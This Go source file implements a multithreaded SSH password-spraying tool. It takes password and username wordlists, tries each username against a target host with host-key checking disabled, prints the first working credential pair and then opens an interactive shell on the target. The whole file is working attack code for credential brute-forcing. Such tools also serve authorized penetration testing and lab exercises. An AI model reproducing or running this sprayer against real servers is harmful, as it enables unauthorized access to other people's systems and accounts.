package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"github.com/thomas-osgood/OGOR/misc/generators"
	"github.com/thomas-osgood/OGOR/output"
	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

type Sprayer struct {
	TargetIP   string
	TargetPort int
	Wordlist   string

	nthreads  int
	commsChan chan string
	stopChan  chan bool
	password  string
	waitgroup *sync.WaitGroup
}

var printer *output.Outputter
var plreader *generators.WordlistGenerator
var wlreader *generators.WordlistGenerator

func (s *Sprayer) BruteTarget() (username string, err error) {
	var i int = 0

	username = ""
	wlreader.CommsChan = s.commsChan

	go wlreader.ReadWordlist()

	for i = 0; i < s.nthreads; i++ {
		s.waitgroup.Add(1)
		go s.worker(&username)
	}
	s.waitgroup.Wait()

	wlreader.StopRead = true

	if len(username) < 1 {
		return "", fmt.Errorf("username not found")
	}

	return username, nil
}

func (s *Sprayer) testUsername(username string) (err error) {
	var config *ssh.ClientConfig
	var conn *ssh.Client
	var target string = fmt.Sprintf("%s:%d", s.TargetIP, s.TargetPort)

	config = &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(s.password)},
		Timeout:         10 * time.Second,
	}

	printer.SysMsgNB(fmt.Sprintf("testing \"%s:%s\"", username, s.password))

	conn, err = ssh.Dial("tcp", target, config)
	if err != nil {
		return err
	}
	defer conn.Close()

	return nil
}

func (s *Sprayer) worker(username *string) {
	defer s.waitgroup.Done()

	var currentUsername string
	var err error

	for currentUsername = range s.commsChan {
		select {
		case <-s.stopChan:
			return
		default:
			err = s.testUsername(currentUsername)
			if err == nil {
				*username = currentUsername
				close(s.stopChan)
			}
		}
	}
}

// connect to the target via SSH and spawn a new interactive terminal.
func SSHConnection(targetIP string, targetPort int, username string, sshpassword string) (err error) {

	printer.PrintChar('=', 60)
	printer.InfMsg("Initializing SSH Connection")
	printer.PrintChar('=', 60)

	sshconfig := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(sshpassword)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Minute,
	}

	connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), sshconfig)
	if err != nil {
		return err
	}
	defer connection.Close()

	session, err := connection.NewSession()
	if err != nil {
		return fmt.Errorf("unable to create SSH session: %s", err.Error())
	}
	defer session.Close()

	modes := ssh.TerminalModes{
		ssh.ECHO:          1,
		ssh.TTY_OP_ISPEED: 14400,
		ssh.TTY_OP_OSPEED: 14400,
	}

	session.Stdin = os.Stdin
	session.Stderr = os.Stderr
	session.Stdout = os.Stdout

	// Create stable shell
	filedescriptor := int(os.Stdin.Fd())
	if term.IsTerminal(filedescriptor) {
		originalstate, err := term.MakeRaw(filedescriptor)
		if err != nil {
			printer.ErrMsg(err.Error())
		}
		defer term.Restore(filedescriptor, originalstate)

		tw, th, err := term.GetSize(filedescriptor)
		if err != nil {
			printer.ErrMsg(err.Error())
		}

		if err := session.RequestPty("xterm-256color", tw, th, modes); err != nil {
			return fmt.Errorf("request for pseudo terminal failed: %s", err.Error())
		}
	}

	err = session.Shell()
	if err != nil {
		return err
	}
	session.Wait()

	fmt.Printf("\n")
	printer.PrintChar('=', 60)

	return nil
}

func init() {
	var err error

	printer, err = output.NewOutputter()
	if err != nil {
		log.Fatalf(err.Error())
	}
}

// references:
// https://medium.com/@marcus.murray/go-ssh-client-shell-session-c4d40daa46cd
func main() {
	var curPass string
	var discovered bool = false
	var err error
	var nthreads int
	var passChan chan string = make(chan string)
	var passList string
	var tgtip string
	var tgtport int
	var username string
	var ulist string

	flag.StringVar(&tgtip, "i", "127.0.0.1", "ip address of target")
	flag.IntVar(&tgtport, "p", 22, "port ssh is being hosted on")
	flag.StringVar(&ulist, "U", "usernames-list.txt", "user wordlist to use for brute-force")
	flag.IntVar(&nthreads, "t", 20, "number of threads to use")
	flag.StringVar(&passList, "P", "passwords-list.txt", "password wordlist to test")
	flag.Parse()

	plreader, err = generators.NewWordlistGenerator(passList)
	if err != nil {
		printer.ErrMsg(err.Error())
		return
	}

	printer.PrintChar('-', 60)
	printer.CenterString("Information", 60)
	printer.PrintChar('-', 60)
	printer.InfMsg(fmt.Sprintf("Target: %s:%d", tgtip, tgtport))
	printer.InfMsg(fmt.Sprintf("Username List: %s", ulist))
	printer.InfMsg(fmt.Sprintf("Password List: %s", passList))
	printer.InfMsg(fmt.Sprintf("Threads: %d", nthreads))
	printer.PrintChar('-', 60)

	plreader.CommsChan = passChan
	defer close(passChan)

	go plreader.ReadWordlist()

	for curPass = range passChan {
		var sprayer *Sprayer = &Sprayer{
			TargetIP:   tgtip,
			TargetPort: tgtport,
			Wordlist:   ulist,
			password:   curPass,
			commsChan:  make(chan string),
			stopChan:   make(chan bool),
			waitgroup:  new(sync.WaitGroup),
			nthreads:   nthreads,
		}

		wlreader, err = generators.NewWordlistGenerator(ulist)
		if err != nil {
			printer.ErrMsg(err.Error())
			return
		}

		username, err = sprayer.BruteTarget()
		if err != nil {
			continue
		}

		discovered = true
		plreader.StopRead = true

		break
	}

	if !discovered {
		printer.ErrMsg("no valid creds discovered")
		return
	}

	printer.SucMsg(fmt.Sprintf("%s:%s", username, curPass))

	err = SSHConnection(tgtip, tgtport, username, curPass)
	if err != nil {
		printer.ErrMsg(err.Error())
		return
	}
	printer.SucMsg("ssh session closed")

}

